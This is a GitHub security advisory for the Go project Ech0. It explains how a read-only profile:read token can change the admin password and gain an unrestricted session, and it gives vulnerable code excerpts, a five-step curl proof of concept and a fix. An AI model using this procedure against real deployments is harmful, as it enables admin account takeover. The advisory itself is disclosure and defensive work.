# [M] Ech0 Scope Bypass: profile:read Access Token Can Change Admin Password and Escalate to Unrestricted Session

## Summary
Severity: Medium
Advisory: GHSA-hm2h-wwwh-g49x
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-hm2h-wwwh-g49x
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/ech0` — affected >=0 <4.4.3

## Details
## Summary

The `PUT /user` endpoint is protected by `RequireScopes("profile:read")`, which is a read-only scope. However, the endpoint performs write operations including password changes. An attacker who obtains an admin's restricted `profile:read` access token can change the admin's password, then login to receive an unrestricted session token that bypasses all scope enforcement.

## Details

The scope enforcement system defines granular scopes (e.g., `echo:read`, `echo:write`, `admin:user`) but has no `profile:write` scope. The `PUT /user` route is protected only by `profile:read`:

```go
// internal/router/user.go:40-44
appRouterGroup.AuthRouterGroup.PUT(
    "/user",
    middleware.RequireScopes(authModel.ScopeProfileRead),
    h.UserHandler.UpdateUser(),
)
```

The `RequireScopes` middleware bypasses all scope checks for session tokens, and for access tokens only verifies the token contains the listed scopes:

```go
// internal/middleware/scope.go:14-19
func RequireScopes(scopes ...string) gin.HandlerFunc {
    return func(ctx *gin.Context) {
        v := viewer.MustFromContext(ctx.Request.Context())
        if v.TokenType() == authModel.TokenTypeSession {
            ctx.Next()
            return
        }
        // ... checks access token has required scopes (line 53)
```

The `UpdateUser` service checks `user.IsAdmin` but does not verify the token's scope is sufficient for write operations:

```go
// internal/service/user/user.go:271-300
func (userService *UserService) UpdateUser(ctx context.Context, userdto model.UserInfoDto) error {
    userid := viewer.MustFromContext(ctx).UserID()
    user, err := userService.userRepository.GetUserByID(ctx, userid)
    // ...
    if !user.IsAdmin {
        return errors.New(commonModel.NO_PERMISSION_DENIED)
    }
    // ...
    if userdto.Password != "" && cryptoUtil.MD5Encrypt(userdto.Password) != user.Password {
        user.Password = cryptoUtil.MD5Encrypt(userdto.Password)  // line 299
    }
```

After the password is changed, the attacker logs in via `POST /login` which calls `issueUserToken` → `CreateClaims`, producing a session token with `Type: "session"` (jwt.go:33). Session tokens bypass `RequireScopes` entirely, granting unrestricted API access.

**Escalation chain:** `profile:read` access token → password change → login → unrestricted session token (bypasses all scope checks) → full admin access including `admin:settings`, `admin:user`, `admin:token`, `file:write`, etc.

## PoC

```bash
# Prerequisites: Admin has created a profile:read access token for a read-only integration
# The attacker has obtained this token (e.g., from compromised integration, log leak, etc.)

ACCESS_TOKEN="<admin_profile_read_access_token>"
SERVER="http://localhost:8080"

# Step 1: Verify the token only has profile:read scope (can read profile)
curl -s -X GET "$SERVER/api/user" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
# Expected: 200 OK with user profile data

# Step 2: Verify the token CANNOT access admin endpoints (scope enforcement works)
curl -s -X GET "$SERVER/api/allusers" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
# Expected: 403 Forbidden (requires admin:user scope)

# Step 3: Change the admin's password using the profile:read token
curl -s -X PUT "$SERVER/api/user" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password":"attackerpass123"}'
# Expected: 200 OK — password changed despite only having profile:read scope

# Step 4: Login with the new password to get an unrestricted session token
curl -s -X POST "$SERVER/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"attackerpass123"}'
# Expected: 200 OK with session JWT token

# Step 5: Use the session token to access admin-only endpoints
SESSION_TOKEN="<session_token_from_step_4>"
curl -s -X GET "$SERVER/api/allusers" \
  -H "Authorization: Bearer $SESSION_TOKEN"
# Expected: 200 OK — full admin access, all scope restrictions bypassed
```

## Impact

An attacker who obtains an admin's `profile:read` access token — intended to be the most restrictive scope available — can:

1. **Change the admin's password** without any write-level scope, violating the principle of least privilege
2. **Escalate to a full unrestricted session token** by logging in with the new credentials
3. **Gain complete admin access** including user management (`admin:user`), system settings (`admin:settings`), token management (`admin:token`), file operations (`file:write`), and all content operations
4. **Lock the original admin out** of password-based authentication (though OAuth/passkey login remains available)

This defeats the entire purpose of the scope system: tokens intended for read-only integrations can be leveraged for full account takeover.

## Recommended Fix

Add a `profile:write` scope and require it for the `PUT /user` endpoint:

```go
// internal/model/auth/scope.go — add new scope
const (
    // ... existing scopes ...
    ScopeProfileRead    = "profile:read"
    ScopeProfileWrite   = "profile:write"  // NEW
)

var validScopes = map[string]struct{}{
    // ... existing entries ...
    ScopeProfileWrite:  {},  // NEW
}
```

```go
// internal/router/user.go:40-44 — require profile:write for PUT
appRouterGroup.AuthRouterGroup.PUT(
    "/user",
    middleware.RequireScopes(authModel.ScopeProfileWrite),  // Changed from ScopeProfileRead
    h.UserHandler.UpdateUser(),
)
```

Similarly, update other write operations currently gated behind `profile:read`:
- `POST /oauth/:provider/bind` → require `profile:write`
- `POST /passkey/register/begin` and `/finish` → require `profile:write`
- `DELETE /passkeys/:id` → require `profile:write`
- `PUT /passkeys/:id` → require `profile:write`

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-hm2h-wwwh-g49x
- https://github.com/lin-snow/Ech0
- https://github.com/lin-snow/Ech0/releases/tag/v4.4.3
